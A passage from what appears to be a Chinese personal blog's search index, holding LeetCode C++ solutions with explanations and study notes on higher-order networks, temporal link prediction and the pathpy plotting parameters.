numToChar[4]={'g','h','i'};\n        numToChar[5]={'j','k','l'};\n        numToChar[6]={'m','n','o'};\n        numToChar[7]={'p','q','r','s'};\n        numToChar[8]={'t','u','v'};\n        numToChar[9]={'w','x','y','z'};\n        dfs(digits,\"\");\n        return ans;\n    }\n};\n```\n\n## 前k个高频元素（中等）\n\n### 题目描述\n\n给你一个整数数组 `nums` 和一个整数 `k` ，请你返回其中出现频率前 `k` 高的元素。你可以按 **任意顺序** 返回答案。\n\n**示例 1:**\n\n```\n输入: nums = [1,1,1,2,2,3], k = 2\n输出: [1,2]\n```\n\n**示例 2:**\n\n```\n输入: nums = [1], k = 1\n输出: [1]\n```\n\n### 思路\n\n用set集合，set放置一个元素是logn的时间复杂度，首先获取每个元素出现的次数，接着记录出现次数对应的元素，并将次数存入set，接着取set前k个数，取出次数对应元素\n\n### 代码\n\n```c++\nclass Solution {\npublic:\n    vector<int> topKFrequent(vector<int>& nums, int k) {\n        unordered_map<int,int>numTimes;\n        unordered_map<int,vector<int>>timeNums;\n        vector<int>ans;\n        set<int>times;\n        for(int num:nums){\n            numTimes[num]++;\n        }\n        for(auto it= numTimes.begin();it!=numTimes.end();it++){\n            timeNums[it->second].push_back(it->first);\n            times.insert(it->second);\n        }\n        for (auto it = times.rbegin();k; ++it) {\n            k-=timeNums[*it].size();\n            ans.insert(ans.end(),timeNums[*it].begin(),timeNums[*it].end());\n        }\n        return ans;\n    }\n};\n```\n\n## 买卖股票的最佳时机（中等）\n\n### 题目描述\n\n给定一个数组 `prices` ，它的第 `i` 个元素 `prices[i]` 表示一支给定股票第 `i` 天的价格。\n\n你只能选择 **某一天** 买入这只股票，并选择在 **未来的某一个不同的日子** 卖出该股票。设计一个算法来计算你所能获取的最大利润。\n\n返回你可以从这笔交易中获取的最大利润。如果你不能获取任何利润，返回 `0` 。\n\n**示例 1：**\n\n```\n输入：[7,1,5,3,6,4]\n输出：5\n解释：在第 2 天（股票价格 = 1）的时候买入，在第 5 天（股票价格 = 6）的时候卖出，最大利润 = 6-1 = 5 。\n     注意利润不能是 7-1 = 6, 因为卖出价格需要大于买入价格；同时，你不能在买入前卖出股票。\n```\n\n### 思路\n\nmin存储遇到的最低价格，max存储往后的最高价格，最佳时机应为前面的最低价格和遇到的最高价格之差\n\n### 代码\n\n```c++\nclass Solution {\npublic:\n    int maxProfit(std::vector<int>& prices) {\n        int minPrice = prices[0];  // 初始化为第一个价格\n        int maxProfit = 0;\n        for (int i = 1; i < prices.size(); ++i) {\n            maxProfit = max(maxProfit, prices[i] - minPrice);\n            minPrice = min(minPrice, prices[i]);\n        }\n        return maxProfit;\n    }\n};\n\n```\n\n## 单词拆分（中等）\n\n### 题目描述\n\n给你一个字符串 `s` 和一个字符串列表 `wordDict` 作为字典。请你判断是否可以利用字典中出现的单词拼接出 `s` 。\n\n**注意：**不要求字典中出现的单词全部都使用，并且字典中的单词可以重复使用。\n\n**示例 1：**\n\n```\n输入: s = \"leetcode\", wordDict = [\"leet\", \"code\"]\n输出: true\n解释: 返回 true 因为 \"leetcode\" 可以由 \"leet\" 和 \"code\" 拼接成。\n```\n\n**示例 2：**\n\n```\n输入: s = \"applepenapple\", wordDict = [\"apple\", \"pen\"]\n输出: true\n解释: 返回 true 因为 \"applepenapple\" 可以由 \"apple\" \"pen\" \"apple\" 拼接成。\n     注意，你可以重复使用字典中的单词。\n```\n\n### 思路\n\n首先将worddict存在set中方便查找，然后用dp[i]存储从0下标到i下标的字符串是否能够被word里的单词组成，dp[i]的更新方式是，遍历前20个字符下标，如果dp[j]为1，也就是该下标之前的都能被表示，就从该下标到i确定组成的新字符串是否在单词列表中\n\n### 代码\n\n```c++\nclass Solution {\npublic:\n    bool wordBreak(string s, vector<string>& wordDict) {\n        unordered_set<string>word;\n        for(string ss : wordDict){\n            word.insert(ss);\n        }\n        vector<int>dp(s.size());\n        for(int i=0;i<s.size();i++){\n            for(int j=i>=20?i-20:0;j<=i;j++){\n                if((j==0||dp[j-1]==1)&&word.count(s.substr(j,i-j+1))){\n                    dp[i]=1;\n                    break;\n                }\n            }\n        }\n        return dp[s.size()-1]==1?true:false;\n    }\n};\n```\n\n\n\n## 寻找重复数（中等）\n\n### 题目描述\n\n给定一个包含 `n + 1` 个整数的数组 `nums` ，其数字都在 `[1, n]` 范围内（包括 `1` 和 `n`），可知至少存在一个重复的整数。\n\n假设 `nums` 只有 **一个重复的整数** ，返回 **这个重复的数** 。\n\n你设计的解决方案必须 **不修改** 数组 `nums` 且只用常量级 `O(1)` 的额外空间。\n\n**示例 1：**\n\n```\n输入：nums = [1,3,4,2,2]\n输出：2\n```\n\n**示例 2：**\n\n```\n输入：nums = [3,1,3,4,2]\n输出：3\n```\n\n### 思路\n\n快慢指针\n\n我们对 nums\\textit{nums}nums 数组建图，每个位置 iii 连一条 i→nums[i]i\\rightarrow \\textit{nums}[i]i→nums[i] 的边。由于存在的重复的数字 target\\textit{target}target，因此 target\\textit{target}target 这个位置一定有起码两条指向它的边，因此整张图一定存在环，且我们要找到的 target\\textit{target}target 就是这个环的入口，那么整个问题就等价于 142. 环形链表 II。\n\n我们先设置慢指针 slow\\textit{slow}slow 和快指针 fast\\textit{fast}fast ，慢指针每次走一步，快指针每次走两步，根据「Floyd 判圈算法」两个指针在有环的情况下一定会相遇，此时我们再将 slow\\textit{slow}slow 放置起点 000，两个指针每次同时移动一步，相遇的点就是答案。\n\n这里简单解释为什么后面将 slow\\textit{slow}slow 放置起点后移动相遇的点就一定是答案了。假设环长为 LLL，从起点到环的入口的步数是 aaa，从环的入口继续走 bbb 步到达相遇位置，从相遇位置继续走 ccc 步回到环的入口，则有 b+c=Lb+c=Lb+c=L，其中 LLL、aaa、bbb、ccc 都是正整数。根据上述定义，慢指针走了 a+ba+ba+b 步，快指针走了 2(a+b)2(a+b)2(a+b) 步。从另一个角度考虑，在相遇位置，快指针比慢指针多走了若干圈，因此快指针走的步数还可以表示成 a+b+kLa+b+kLa+b+kL，其中 kkk 表示快指针在环上走的圈数。联立等式，可以得到\n\n```\n2(a+b)=a+b+kL2(a+b)=a+b+kL\n2(a+b)=a+b+kL\n```\n\n解得 `a=kL−ba=kL-ba=kL−b`，整理可得\n\n```\na=(k−1)L+(L−b)=(k−1)L+ca=(k-1)L+(L-b)=(k-1)L+c\na=(k−1)L+(L−b)=(k−1)L+c\n```\n\n从上述等式可知，如果慢指针从起点出发，快指针从相遇位置出发，每次两个指针都移动一步，则慢指针走了 aaa 步之后到达环的入口，快指针在环里走了 k−1k-1k−1 圈之后又走了 ccc 步，由于从相遇位置继续走 ccc 步即可回到环的入口，因此快指针也到达环的入口。两个指针在环的入口相遇，相遇点就是答案。\n\n### 代码\n\n```c++\nclass Solution {\npublic:\n    int findDuplicate(vector<int>& nums) {\n        int i=0;\n        int j=0;\n        do{\n            i=nums[i];\n            j=nums[nums[j]];\n        }while(i!=j);\n        i=0;\n        while(i!=j){\n            i=nums[i];\n            j=nums[j];\n        }\n        return i;\n    }\n};\n```\n\n","tags":["c","c++"],"categories":["数据结构"]},{"title":"高阶网络学习","url":"/post/5ad7933.html","content":"\n## 高阶网络\n\n### 一：高阶网络和传统网络区别\n\n看了那么多文献，大概总结于一点，高阶网络是多维的，传统网络是一维的，怎么解释呢，就是高阶网络不再停留于单纯两个节点之间的关系，而是多个节点的关系。\n\n<!--more-->\n\n以链路预测举例吧，传统链路预测会为每两个节点之间预测连接概率，事实上这种方法忽视了很多重要信息，比如可能多个节点之间有重要联系，缺一不可，所以需要以整个节点组成的局部网络，也就是单纯形为研究对象。\n\n### 二：高阶网络重要概念\n\n#### 超图\n\n在介绍超图之前先介绍什么是超边吧，超边不是我们以为的那个边，有固定的两个点组成边，而是对于一组相互联系的边组成的集合，对于它们来说有一条边联系着它们，但是也不是传统的两个节点之间的边，所以就叫做**超边**。\n\n**超图**顾名思义就是由超边组成的图\n\n#### 单纯复形\n\n同样先介绍什么是**单纯形**(simplex)，和超图不同的是，同样对于一组相互联系的边组成的集合，对于超图来说，是由超边将节点连接起来的，对于单纯复形来说是由实实在在的边连接起来的，也就是全连接图，每个节点都和集合里的其他节点相连，例如，节点是0-单纯形，连接是1-单纯形，三角形是2-单纯形，四面体是3-单纯形，以此类推。\n\n单形的面是该单形的局部全连接子图，比如四面体里面存在三角形，存在连接，节点，那么0-单纯形，1-单纯形，2-单纯形都是3-单纯形的面\n\n**单纯复形**就是由单纯形以及该单纯形的面组成的集合，**和超图不同的**是超图不一定有其超边的子超边，但是单纯复形一定有其单纯形的子单纯形，也就是面\n\n### 三：时序网络\n\n网络不可能是一成不变的，即节点以及节点之间的连接是不可能一成不变的，可能会有新增节点，可能会有删除的节点，以及节点之间的联系有可能变小，有可能变大，这也就导致了不同时间下网络的状态往往是不同的，这就是时序网络。\n\n### 四：链路预测\n\n基于时序网络，高阶网络，这里提到基于局部信息的链路预测，和传统链路预测不同点有两处：\n\n+ 不再以两节点组成的边为研究对象，而是基于一个单纯复形作为研究对象\n+ 链路预测不再只考虑一个时间点的链路信息，链路预测应当要遵循网络自身的变化规律，要考虑前面时间段网络的动态变化\n\n基于高阶网络和时序网络的链路预测方式有很多，在此处考虑的预测开团是否会存在单纯闭包事件：开团指当前时间段未形成团的节点集合，团即指一个单纯形，闭包事件也就是节点之间建立了连接，形成了单纯形\n\n### 五：虚假网络生成\n\n三个要点：\n\n+ 成本低\n+ 符合时序网络变化（用链路预测进行检验）\n+ 改变大（用高阶网络的重要节点识别）\n\n思路：首先获取到会对网络改变性大的单纯形，然后找到最有概率出现的但实际不存在的单纯形，替代网络中最没有概率出现的单纯形\n\n使用算法：GCN-GAN\tNETWORKGAN\n\n先通过识别重要节点的算法识别出网络中的重要节点和序列，然后对包含该重要节点的序列的局部网络进行链路预测，这样预测出来的边应该是更具影响力且对网络影响比较大的，如果要增边的话就对原网络通过增加一个孤立节点然后预测最有可能连接的其他边，然后用其他链路预测的方式以及根据老师之前提到的进行评估我生成的边或者点是否是符合网络变化的，以及更多节点或者边重要性的算法来评估我生成的边或者点是否是重要节点或者边\n\npathpy.visualisation.html @singledispatch def plot(network: Any,\n         **params: dict) -> None\n在 jupyter 笔记本中绘制路径对象的交互式可视化。此泛型函数支持 pathpy 的实例。网络，可怜。时间网络，可悲。高阶网络，可悲。多序模型和路径。路径。请参阅参数说明中不同可视化项的说明。\n形参:\n\nnetwork – 要可视化的对象。根据传递对象的类型，将生成以下可视化效果： 网络：具有力导向布局的网络的交互式可视化。高阶网络：一阶网络的交互式可视化，力基于高阶网络计算。通过设置 plot_higher_order_nodes=True，可以绘制具有未投影的高阶节点的网络。多阶模型：一阶网络的交互式可视化，基于多阶模型计算力。时间网络：时间网络的交互式和动态可视化。路径：冲积图，显示通过给定焦点节点的马尔可夫或非马尔可夫轨迹。\n\nparams – 带有可视化参数的字典。这些参数将传递到可由用户扩展的可视化模板。默认 pathpy 模板支持以下参数，具体取决于要可视化的对象类型（请参阅括号）。\n\n+ width： int （all） 包含 jupyter 可视化效果的 div 元素的宽度。默认值为 400。\n+ height： int （all） 包含 jupyter 可视化效果的 div 元素的高度。默认值为 400。\n+ 模板：字符串（全部）自定义可视化模板文件的路径。如果省略此参数，将使用适合相应对象的默认 pathpy 可视化模板。\n+ d3js_path：指向 d3js 库的字符串（所有）URL。默认情况下，d3js 将从 https://d3js.org/d3.v4.min.js 加载。对于脱机操作，可以改为指定指向 d3js 本地副本的 URL。对于自定义模板，可以使用特定的 d3js 版本。\n+ node_size：int，dict（Network，HigherOrderNetwork，TemporalNetwork，MultiOrderModel）指定所有节点半径的int值，或将自定义节点大小分配给独立节点的字典。默认值为 5.0。\n+ edge_width：int、float、dict（Network、HigherOrderNetwork、TemporalNetwork、MultiOrderModel） 指定所有边的半径的 int 值，或将自定义边宽分配给插入边的字典。默认值为 0.5。\n+ node_color：string， dict （Network， HigherOrderNetwork， TemporalNetwork， MultiOrderModel） 指定所有节点的 HTML 颜色的字符串值，或将自定义节点颜色分配给独立节点的字典。可以使用HTML命名的颜色（“红色”，“蓝色”，“黄色”）或HEX-RGB值。默认值为“#99ccff”。（浅蓝色） \n+ node_text：字符串、字典（Network、HigherOrderNetwork、MultiOrderModel）将鼠标悬停在节点上时显示的文本，例如包含节点属性、全名等。默认为节点名称。\n+ edge_color：string， dict （Network， HigherOrderNetwork， TemporalNetwork， MultiOrderModel） 指定所有边缘的 HTML 颜色的字符串值，或将自定义边缘颜色分配给插入边缘的字典。可以使用HTML命名的颜色（“红色”，“蓝色”，“黄色”）或HEX-RGB值。默认值为“#cccccc”（浅灰色）。\n+ edge_opacity：float（Network、HigherOrderNetwork、TemporalNetwork、MultiOrderModel） 0.0 到 1.0 范围内所有边的不透明度。默认值为 1.0。\n+ edge_arrows：bool （Network， HigherOrderNetwork， MultiOrderNetwork） 是否为有向网络绘制边缘箭头。默认值为 True。\n+ label_color：字符串（Network、HigherOrderNetwork、TemporalNetwork、MultiOrderModel） 节点标签的 HTML 颜色。可以使用HTML命名的颜色（“红色”，“蓝色”，“黄色”）或HEX-RGB值。默认值为“#cccccc”（浅灰色）。\n+ label_opacity：float （Network， HigherOrderNetwork， TemporalNetwork， MultiOrderModel） 标签的不透明度。默认值为 1.0。\n+ label_size：str（Network， HigherOrderNetwork， TemporalNetwork， MultiOrderNetwork） CSS 字符串，指定用于标签的字体大小。默认值为“8px”。\n+ label_offset：列表（网络、高阶网络、时态网络、多阶网络）标签与节点中心的偏移量 [x，y]。对于 [0，0] 标签将显示在节点的中心。第一个和第二个分量的正值将标签分别向右和向上移动。默认值为 [0， -10]，在节点上方显示标签，以适应比节点宽的标签。\n+ force_charge：浮点，int （） 要在力导向布局中使用的节点的电荷强度。默认值为 -20 \n+ force_repel：float，int（全部）节点之间排斥力的强度。较大的负值将增加节点之间的距离。默认值为 -200。\n+ force_alpha：浮点数（全部）要传递给基础力导向布局算法的 alpha 目标（收敛阈值）。默认值为 0.0。\n+ plot_higher_order_nodes：高阶网络 如果设置为 True，则将绘制具有高阶节点的原始高阶网络。如果为 False，则将绘制具有高阶力导向布局的一阶投影。默认值为 True。\n+ ms_per_frame：int（时间网络）在时间网络的可视化中每帧应显示多少毫秒。1000/ms_per_frame 指定可视化的帧速率。默认值 20 产生 50 fps 的帧速率。\n+ ts_per_frame：int（时间网络）在可视化的每一帧中应显示时态网络中的时间戳数。对于值为 1 时，每个时间戳显示在单独的帧中。对于较高的值，多个时间戳将聚合到单个帧中。对于零值，仿真速度将调整为事件间时间分布，以便平均每秒显示五次交互。默认值为 1。\n+ look_behind：int （时间网络） look_ahead 和 look_behind 参数定义当前时间戳周围的时间范围，在该范围内，将考虑将带时间戳的边用于力导向布局。大于 1 的值会导致布局平滑更改。默认值为 10。\n+ look_ahead：int（时间网络） look_ahead 和 look_behind 参数定义当前时间戳周围的时间范围，在该范围内，将考虑将带时间戳的边用于力导向布局。大于 1 的值会导致布局平滑更改。默认值为 10。\n+ max_time：int（临时网络）要可视化的最大时间戳。可用于限制超长时态网络的可视化。如果为“无”，将显示整个序列。默认值为“无”。\n+ active_edge_width：浮点数（时态网络）一个浮点值，它指定当前活动边的宽度。默认值为 4.0。\n+ inactive_edge_width：浮点数（时态网络）一个浮点值，它指定当前活动边的宽度。默认值为 0.5。\n+ active_edge_color：字符串（临时网络）一个字符串值，它指定当前活动边缘的 HTML 颜色。可以使用HTML命名的颜色（“红色”，“蓝色”，“黄色”）或HEX-RGB值。默认值为“#ff0000”（红色）。\n+ inactive_edge_color：字符串（临时网络）一个字符串值，它指定非活动边缘的 HTML 颜色。可以使用HTML命名的颜色（“红色”，“蓝色”，“黄色”）或HEX-RGB值。默认值为“#cccccc”（浅灰色）。\n+ active_node_color：字符串（临时网络）一个字符串值，它指定活动节点的 HTML 颜色。可以使用HTML命名的颜色（“红色”，“蓝色”，“黄色”）或HEX-RGB值。默认值为“#ff0000”（红色）。\n+ inactive_node_color：字符串（临时网络）一个字符串值，它指定非活动节点的 HTML 颜色。可以使用HTML命名的颜色（“红色”，“蓝色”，“黄色”）或HEX-RGB值。默认值为“#cccccc”（浅灰色）。\n","tags":["python"],"categories":["复杂网络"]},{"title":"leetcode100题_3","url":"/post/7561e93a.html","content":"\n2023.08.28：原来才刷六十道，假期一百道leetcode宣告失败！\n\n<!--more-->\n\n## 复制带随机指针的链表（中等）\n\n### 题目描述\n\n给你一个长度为 `n` 的链表，每个节点包含一个额外增加的随机指针 `random` ，该指针可以指向链表中的任何节点或空节点。\n\n构造这个链表的 **[深拷贝](https://baike.baidu.com/item/深拷贝/22785317?fr=aladdin)**。 深拷贝应该正好由 `n` 个 **全新** 节点组成，其中每个新节点的值都设为其对应的原节点的值。新节点的 `next` 指针和 `random` 指针也都应指向复制链表中的新节点，并使原链表和复制链表中的这些指针能够表示相同的链表状态。**复制链表中的指针都不应指向原链表中的节点** 。\n\n例如，如果原链表中有 `X` 和 `Y` 两个节点，其中 `X.random --> Y` 。那么在复制链表中对应的两个节点 `x` 和 `y` ，同样有 `x.random --> y` 。\n\n返回复制链表的头节点。\n\n用一个由 `n` 个节点组成的链表来表示输入/输出中的链表。每个节点用一个 `[val, random_index]` 表示：\n\n- `val`：一个表示 `Node.val` 的整数。\n- `random_index`：随机指针指向的节点索引（范围从 `0` 到 `n-1`）；如果不指向任何节点，则为 `null` 。\n\n你的代码 **只** 接受原链表的头节点 `head` 作为传入参数。\n\n### 思路（两种思路）\n\n#### 思路一：根据next新建节点\n\n遍历原链表，深复制每个节点并附上索引，此处先不管random，再次遍历原链表，获取原链表random节点在原链表的索引，再确定目标链表的对应索引位置\n\n该方法的时间复杂度为o(n^2)\n\n#### 代码一\n\n```c++\nclass Solution {\npublic:\n    int index(Node*root,Node*randomNode){\n        Node*copy=root;\n        int indexNum=0;\n        while(copy){\n            if(copy==randomNode){\n                return indexNum;\n            }\n            indexNum++;\n            copy=copy->next;\n        }\n        return 0;\n    }\n    Node* copyRandomList(Node* head) {\n        Node* head2=new Node(0);\n        Node* copy2=head2;\n        int indecNum;\n        Node* copy=head;\n        vector<Node*>sourceNode;\n        while(copy){\n            Node* newNode=new Node(copy->val);\n            head2->next=newNode;\n            head2=head2->next;\n            sourceNode.push_back(newNode);\n            copy=copy->next;\n        }\n        head2->next=NULL;\n        head2=copy2->next;\n        copy2=head2;\n        copy=head;\n        while(head){\n            if(head->random==NULL){\n                head2->random=NULL;\n            }else{\n                indecNum=index(copy,head->random);\n                head2->random=sourceNode[indecNum];\n            }\n            head=head->next;\n            head2=head2->next;\n        }\n        return copy2;\n    }\n};\n```\n\n#### 思路二：根绝random和next新建节点，回溯递归\n\n建立一个哈希表，哈希表存的是原节点和对应节点，如果原节点还没有建立好对应节点，就新建对应节点，然后再新建next和random\n\n#### 代码二\n\n```c++\nclass Solution {\npublic:\n    unordered_map<Node*, Node*> cachedNode;\n\n    Node* copyRandomList(Node* head) {\n        if (head == NULL) {\n            return NULL;\n        }\n        if (!cachedNode.count(head)) {\n            Node* headNew = new Node(head->val);\n            cachedNode[head] = headNew;\n            headNew->next = copyRandomList(head->next);\n            headNew->random = copyRandomList(head->random);\n        }\n        return cachedNode[head];\n    }\n};\n```\n\n## 编辑距离（困难）\n\n### 题目描述\n\n给你两个单词 `word1` 和 `word2`， *请返回将 `word1` 转换成 `word2` 所使用的最少操作数* 。\n\n你可以对一个单词进行如下三种操作：\n\n- 插入一个字符\n- 删除一个字符\n- 替换一个字符\n\n### 思路\n\n（好难/(ㄒoㄒ)/~~）\n\n动态规划：\n\n+ `dp[i][j]`表示word1的前i个要转换为word2的前j个需要的最短步长，比如`df[0][0]`表示word1的前0个字符转换为word2的前0个字符所需要的步长，就是0，`df[2][0]`表示word1的前两个字符转换为word2的前两个字符所需的最短步长，即2，就是删除两个字符才能变成长度为0的字符，所以可以对`df[0-length1][0]`和`df[0][0-length2]`进行初始化\n+ 然后就是动态方程的设置，`df[i][j]`在word1的第i个字符等于word2的第j个字符的时候肯定直接是`df[i-1][j-1]+1`,不用做什么操作，因为本来就相同了，如果不等就可以考虑题目所说的三种操作：\n  + 第一种是在让前i-1个字符变成前j-1个字符的前提下进行替换\n  + 第二种是在让前i-1个字符变成前j个字符的前提下进行删除第i个字符的操作\n  + 第三种就是在让前i个字符变成前j-1个字符的前提下进行增加第j个字符的操作（注意，这里的i和j针对两个不同的字符串）\n  + 最后取这三者的最小值\n\n### 代码\n\n```c++\nclass Solution {\npublic:\n    int minDistance(string word1, string word2) {\n        int length1=word1.size();\n        int length2=word2.size();\n        vector<vector<int>>df(length1+1,vector<int>(length2+1,0));\n        for(int i=1;i<=length1;i++){\n            df[i][0]=i;\n        }\n        for(int i=1;i<=length2;i++){\n            df[0][i]=i;\n        }\n        for(int i=0;i<length1;i++){\n            for(int j=0;j<length2;j++){\n                if(word1[i]==word2[j])df[i+1][j+1]=df[i][j];\n                else df[i+1][j+1]=min(df[i][j+1],min(df[i+1][j],df[i][j]))+1;\n            }\n        }\n            return df[length1][length2];\n    }\n};\n```\n\n## 路径总和（中等）\n\n### 题目描述\n\n给定一个二叉树的根节点 `root` ，和一个整数 `targetSum` ，求该二叉树里节点值之和等于 `targetSum` 的 **路径** 的数目。\n\n**路径** 不需要从根节点开始，也不需要在叶子节点结束，但是路径方向必须是向下的（只能从父节点到子节点）。\n\n### 思路\n\n前缀和+哈希（好歹是我自己想出来的/(ㄒoㄒ)/~~）\n\n保存每个节点的前缀和，连续节点的和可以用两个节点的前缀和相减得到结果，为了避免遍历，用哈希保存前缀和结果，用find方便查找答案\n\n### 代码\n\n```c++\nclass Solution {\npublic:\n    int count;\n    unordered_map<long long,int>path;\n    void dfsPath(long long allSum,TreeNode*&root,int targetSum){\n        if(root==NULL){\n            return;\n        }\n        allSum+=root->val;\n        auto it=path.find(allSum-targetSum);\n        if(it!=path.end()){\n            count+=it->second;\n        }\n        path[allSum]++;\n        dfsPath(allSum,root->left,targetSum);\n        dfsPath(allSum,root->right,targetSum);\n        path[allSum]--;\n    }\n    int pathSum(TreeNode* root, int targetSum) {\n        path[0]=1;\n        long long allSum=0;\n        dfsPath(allSum,root,targetSum);\n        return count;\n    }\n};\n```\n\n## 只出现一次的数字（简单）\n\n### 题目描述\n\n给你一个 **非空** 整数数组 `nums` ，除了某个元素只出现一次以外，其余每个元素均出现两次。找出那个只出现了一次的元素。\n\n你必须设计并实现线性时间复杂度的算法来解决此问题，且该算法只使用常量额外空间。\n\n### 知识点\n\n1. 异或：\n\n   ```c++\n   a^a\n   ```\n\n   \n\n### 思路（两种思路）\n\n#### 思路一：哈希\n\n时间空间复杂度均为o(n)，用哈希存下每个元素出现的次数，超过两次就删除这个元素，最后返回剩下的元素\n\n#### 代码一\n\n```c++\nclass Solution {\npublic:\n    int singleNumber(vector<int>& nums) {\n        unordered_map<int,int>hashMap;\n        for(int number : nums){\n            if(++hashMap[number]==2){\n                hashMap.erase(number);\n            }\n        }\n        return hashMap.begin()->first;\n    }\n};\n```\n\n#### 思路二：异或\n\n异或满足交换律，且相同元素异或为0，任意元素异或0为原值\n\n#### 代码二\n\n```c++\nclass Solution {\npublic:\n    int singleNumber(vector<int>& nums) {\n        for(int i=1;i<nums.size();i++){\n            nums[0]^=nums[i];\n        }\n        return nums[0];\n    }\n};\n```\n\n## 零钱兑换（中等）\n\n### 题目描述\n\n给你一个整数数组 `coins` ，表示不同面额的硬币；以及一个整数 `amount` ，表示总金额。\n\n计算并返回可以凑成总金额所需的 **最少的硬币个数** 。如果没有任何一种硬币组合能组成总金额，返回 `-1` 。\n\n你可以认为每种硬币的数量是无限的。\n\n### 思路（两种思路）\n\n#### 思路一：dfs\n\n**会超时**（刷了快一个月题还是只会暴力求解/(ㄒoㄒ)/~~）\n\n用递归得到能组成余额的最小值\n\n#### 代码一\n\n```c++\nclass Solution {\npublic:\n    int min_size=10000;\n    void coinMinSize(priority_queue<int,vector<int>,greater<int>> remainedMoney,int remainedamount,int number){\n        if(number>=min_size)return;\n        int money=remainedMoney.top();\n        int iter=remainedamount/money;\n        remainedMoney.pop();\n        if(remainedMoney.empty()){\n            if(remainedamount%money==0){\n                min_size=min(min_size,number+iter);\n            }\n            return;\n        }\n        for(int i=0;i<=iter;i++){\n            number+=i;\n            coinMinSize(remainedMoney,remainedamount-i*money,number);\n            number-=i;\n        }\n    }\n    int coinChange(vector<int>& coins, int amount) {\n        priority_queue<int,vector<int>,greater<int>>remainedMoney;\n        for(int coin:coins){\n            remainedMoney.push(coin);\n        }\n        coinMinSize(remainedMoney,amount,0);\n        if(min_size==10000)return -1;\n        return min_size;\n        return 1;\n    }\n};\n```\n\n#### 思路二：动态规划\n\ndp[i]表示要组成金额为i的硬币需要的最小数量，我们知道硬币一定是从coins里面选一个，因为硬币最后一个肯定也是从coins里面选，那么去掉最后一个的金额需要硬币的数量一定是原本数量-1，因为我们只去掉了最后一个，所以问题就变成了怎么求去掉最后一个的金额的需要的硬币的数量，所以有：\n\n```c++\ndp[i]=min(dp[i-coin1],dp[i-coin2],dp[i-coin3]……)+1\n```\n\ncoin代表所拥有的硬币种类，按照该公式对数组进行更新即可\n\n#### 代码二\n\n```c++\nclass Solution {\npublic:\n    int coinChange(vector<int>& coins, int amount) {\n        vector<int>dp(amount+1,10001);\n        dp[0]=0;\n        for(int i=1;i<=amount;i++)\n            for(int coin:coins)\n                if(i-coin>=0)dp[i]=min(dp[i-coin]+1,dp[i]);\n        return dp[amount]==10001?-1:dp[amount];\n    }\n};\n```\n\n## [柱状图中最大的矩形](https://leetcode.cn/problems/largest-rectangle-in-histogram/)(困难)\n\n### 题目描述\n\n给定 *n* 个非负整数，用来表示柱状图中各个柱子的高度。每个柱子彼此相邻，且宽度为 1 。\n\n求在该柱状图中，能够勾勒出来的矩形的最大面积。\n\n \n\n**示例 1:**\n\n![img](2023-8-18%E4%BB%8A%E6%97%A5%E7%BB%83%E4%B9%A0/histogram.jpg)\n\n```\n输入：heights = [2,1,5,6,2,3]\n输出：10\n解释：最大的矩形为图中红色区域，面积为 10\n```\n\n### 思路（两种思路）\n\n#### 思路一：模仿接雨水的按行求\n\n**会超时**\n\n（srds这是lz自己的思路，竟然超时了/(ㄒoㄒ)/~~）\n\n求每一行能达到的最大面积，从下往上遍历，获取高度在一定范围的下标\n\n#### 代码一\n\n```c++\nclass Solution {\npublic:\n    int largestRectangleArea(vector<int>& heights) {\n        vector<int>index1;\n        int i=*min_element(heights.begin(),heights.end());\n        int length=heights.size();\n        for(int i=0;i<length;i++){\n            index1.push_back(i);\n        }\n        vector<int>index2;\n        int use_length=0;\n        int used_length=0;\n        int max_area=0;\n        while(index1.size()!=0){\n            if(i*index1.size()<=max_area){\n                break;\n            }\n            use_length=0;\n            for(int j=0;j<index1.size();j++){\n                used_length=0;\n                if(j<index1.size()&&heights[index1[j]]>=i){\n                    used_length++;\n                    index2.push_back(index1[j]);\n                }\n                while(j<(index1.size()-1)&&(index1[j+1]==index1[j]+1)&&(heights[index1[j+1]]>=i)){\n                    used_length++;\n                    index2.push_back(index1[j]+1);\n                    j++;\n                }\n                use_length=max(use_length,used_length);\n            }\n            max_area=max(max_area,use_length*i);\n            i++;\n            index1=vector<int>(index2.begin(),index2.end());\n            index2.clear();\n        }\n        return max_area;\n    }\n};\n```\n\n#### 思路二：运用栈\n\n借鉴了大佬根据栈做的代码\n\n思路有点长直接附上大佬讲解链接：[84. 柱状图中最大的矩形 - 力扣（LeetCode）](https://leetcode.cn/problems/largest-rectangle-in-histogram/solutions/142012/bao-li-jie-fa-zhan-by-liweiwei1419/?envType=study-plan-v2&envId=top-100-liked)\n\n#### 代码二\n\n```c++\nclass Solution {\npublic:\n    int largestRectangleArea(vector<int>& heights) {\n        int length=heights.size();\n        if(length==0)return 0;\n        stack<int>index;\n        int max_area=0;\n        int top;\n        for(int i=0;i<length;i++){\n            while(!index.empty()&&heights[i]<heights[index.top()]){\n                top=index.top();\n                index.pop();\n                if(index.empty()){\n                    max_area=max(max_area,(i*heights[top]));\n                }else{\n                    max_area=max(max_area,(i-index.top()-1)*heights[top]);\n                }\n            }\n            index.push(i);\n        }\n        int pre_index;\n        int now_index=index.top();\n        int later_index=now_index+1;\n        while(!index.empty()){\n            index.pop();\n            if(index.empty()){\n                max_area=max(max_area,heights[now_index]*length);\n                \n            }else{\n                pre_index=index.top();\n                max_area=max(max_area,(later_index-pre_index-1)*heights[now_index]);\n            }\n            now_index=pre_index;\n        }\n        return max_area;\n    }\n};\n```\n\n## [删除链表的倒数第 N 个结点](https://leetcode.cn/problems/remove-nth-node-from-end-of-list/)（中等）\n\n### 题目描述\n\n给你一个链表，删除链表的倒数第 `n` 个结点，并且返回链表的头结点。\n\n### 思路：双指针\n\n（终于没有超时了啊啊啊！！！！）\n\n设置双指针，题目提示一次遍历，那怎么一次遍历就可以得到倒数节点呢，那就是双指针！，我们知道倒数节点和最后一个节点之间的距离，那最开始就设好两个开始遍历的点，点之间的距离就是倒数的数目，直到靠后的那个节点到达了尾节点，就可以得到我们要删除的节点，一次遍历就可以成功解决\n\n### 代码\n\n```c++\nclass Solution {\npublic:\n    ListNode* removeNthFromEnd(ListNode* head, int n) {\n        ListNode*pre=head;\n        ListNode*later=head;\n        while(n--){\n            later=later->next;\n        }\n        if(later==NULL)return head->next;\n        while(later->next!=NULL){\n            later=later->next;\n            pre=pre->next;\n        }\n        pre->next=pre->next->next;\n        return head;\n    }\n};\n```\n\n## 搜索二维矩阵（中等）\n\n### 题目描述\n\n给你一个满足下述两条属性的 `m x n` 整数矩阵：\n\n- 每行中的整数从左到右按非递减顺序排列。\n- 每行的第一个整数大于前一行的最后一个整数。\n\n给你一个整数 `target` ，如果 `target` 在矩阵中，返回 `true` ；否则，返回 `false` 。\n\n \n\n**示例 